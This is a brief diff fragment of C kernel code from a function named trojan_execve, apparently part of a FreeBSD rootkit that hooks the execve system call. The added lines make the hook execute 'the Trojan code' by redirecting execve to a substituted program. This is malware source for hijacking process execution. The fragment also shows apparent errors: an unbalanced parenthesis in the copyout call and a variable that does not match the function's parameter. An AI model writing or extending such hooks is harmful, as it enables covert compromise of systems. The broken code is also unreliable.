@@ -66,6 +66,11 @@ trojan_execve(struct thread *td, void *syscall_args)
 		 */
 		user_ea = (struct execve_args *)addr + sizeof(t_fname);
 		copyout(&kernel_ea, user_ea, sizeof(struct execve_args);
+	
+		/*
+		 * Execute the Trojan code
+		 */
+		return execve(cur_thread, user_ea);
 	}
 
 	return 1;
